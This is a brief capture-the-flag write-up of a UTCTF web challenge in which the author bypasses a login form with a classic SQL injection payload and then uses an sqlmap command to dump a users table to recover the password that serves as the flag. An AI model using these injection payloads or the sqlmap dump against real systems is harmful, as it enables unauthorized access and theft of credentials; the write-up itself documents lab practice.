** **Write-up : epic admin pwn***

this challenge is epic i promise the flag is the password. 

> DESCRIPTION

First when u open the website there are login page so tried SQL Injection To check it . i use `' OR 1 = 1 -- -` its work but we don't get any flag just welcome message u_u so is injectable but no flag there cuz the flag is the password so i use  *sqlmap* to save time .

    sqlmap -u 'http://web2.utctf.live.5006/' --data="username=';SELECT * from user --&pass=" --risk=1 -D public -T users --dump

![enter image description here](https://lh3.googleusercontent.com/__VEn4F6xB3TuFHjfHA4PfBdUICK5sU9uxJvu-bus4J8LODGPufjVclCSkfOl3a3PIBTKPRsvkrmFm5PcTkzNx24Tf_CsE885eCcwuFqORiv06lV5Y6X_yXNeynxzbX4FffaZvyQ7foawxbj0GLzZtuHRL_U3wx8VxBt3a5fq7B2B4iI5XbVT6vELGB7B5m4q3Ql2dnccSL7-2E0n6nHR1mOIUawTUtcMsAbjn9ctnz93A2SXiTcI4pMRlElAjQ-yCnCTqm4KWOHPqeGCFBVbqVdFkrr1yxzuDNlZ1MdsS9gI_IwsKTepQx2iI06Wo1-nKh9ozHK2YjruA9LTaXMERlmJqomYU5QoqUWuf_XebssAxrVX2CwUqWLMZLhmTeIUGb1_3Wnb4IfQhY4flJayiTE_4dGjGgmlHGbytlnxhKPujIATxrWZ7TfKXuSbf7TedQs-tgl6bYHHUUg0wJcO_o4VsaVzCRA8m-Q0fcDM-Ys2CJ0s6N62yZhlXv6mJqdf_3G9LfRI9IaxllRWg6kHkw4jmRZCtB-XOfl0K-_AxjVXRw31CE2AhV4fJgaomJvlWnqJ4Cz6eLgsP_1AqbmlY0UkXf9Fmy6Fhkj4NThN0ayiS28yUoe80YzYpDZScS6S0ipHgxR_-YkgvnZWJBzXThCDTRTky_dtid2vjTwdRPSxF8-WZB-=w777-h374-no)
